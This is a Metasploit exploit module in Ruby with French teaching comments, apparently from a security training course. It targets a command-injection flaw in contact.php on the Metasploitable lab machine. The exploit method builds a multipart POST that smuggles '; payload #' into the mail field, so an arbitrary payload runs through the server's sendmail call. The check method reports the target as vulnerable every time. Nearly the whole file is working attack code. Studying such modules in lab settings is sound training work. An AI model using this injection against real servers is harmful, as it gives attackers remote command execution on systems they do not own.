# encoding: utf-8
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient #pour notre requête HTTP

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Metasploitable Injection Commande Sendmail",
      'Description'    => %q{
        Exploit personnalisé, créé pour exploiter une vulnérabilité dans le code PHP de contact.php sur Metasploitable.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Michel - Cyberini' ],
      'References'     =>
        [
          [ 'URL', 'https://cyberini.com' ]
        ],
      'Platform'       => 'unix', #on vise unix
      "Arch"           => ARCH_CMD, #on vise un interpréteur en ligne de commande (car le page vulnérable appelle une commande)
      'Targets'        =>
        [
          [ 'Automatic', {}] #cible automatique, on peut ici définir puis gérer différentes cibles
        ],
      'Payload'        =>
        {
          'DisableNops' => true,
	  'Compat'      =>
            {
              'PayloadType' => 'cmd', #notre payload est de type cmd (injection de commande)
            }
        },
      'Privileged'     => false, #nous ne serons pas root sur la machine 
      'DisclosureDate' => "", #date de découvert de la vulnérabilité
      'DefaultTarget'  => 0)) #cible par défaut = 0 (on en a qu'une ici)

      register_options(
      [
	    OptString.new('PAGE',   [true, 'Page vulnérable', 'contact.php']) #ajoute une option (la page vulnérable)
      ])
  end

  def check #pour vérifier si l'exploit fonctionnera
    return Exploit::CheckCode::Vulnerable #retourne toujours qu'on est "vulnérable"...
  end

  def exploit #principale fonction activée lors de la commande "exploit"

    #injecte la charge utile dans la commande sendmail ([.../usr/sbin/sendmail -f...]; nohup payload & #[reste qui sera exclu par dièse])
    email = "; " + payload.encoded + " #" # ; permet de lancer une commande additionnelle (notre payload), # commente donc annule le reste

    data = Rex::MIME::Message.new
    data.add_part('submit', nil, nil, 'form-data; name="submit"') #on soumet artificiellement le formulaire (bouton "submit")
    data.add_part(email, nil, nil, 'form-data; name="mail"') #on soumet le mail avec la charge utile (bouton "mail")
    data.add_part("#{rand_text_alphanumeric(2 + rand(20))}", nil, nil, 'form-data; name="message"') #on soumet un message aléatoire ("message")

    print_status("Envoi de la requête...") #print_status affiche un message de statut dans Metasploit
    res = send_request_cgi(
      'method'   => 'POST', #on poste la requete (HTTP POST)
      'uri'      => normalize_uri(target_uri.path, "#{datastore['PAGE']}"), #on poste vers la page vulnérable (contact.php par défaut)
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'data'     => data.to_s #les données préparées précédemment sont ici
    )

    if res && res.code != 200 #vérifie la réponse du serveur, 200 = Ok
      fail_with(Failure::UnexpectedReply, "Payload non exécuté (HTTP STATUS != 200)")
    else
      print_good("Le serveur a répondu correctement") #print_good affiche un message de succès dans Metasploit
    end
    #PS : - reload_all permet de charger un module dans Metasploit (en le mettant par exemple d'abord dans /root/.msf4/modules/exploits/
    #     - ne pas oublier de refaire la commande use exploit/votrecheminici pour être sûr que les modifications soient prises en compte
	#	  - ne pas oublier "show payloads" et "set payload X" pour changer de payload si besoin
  end
end
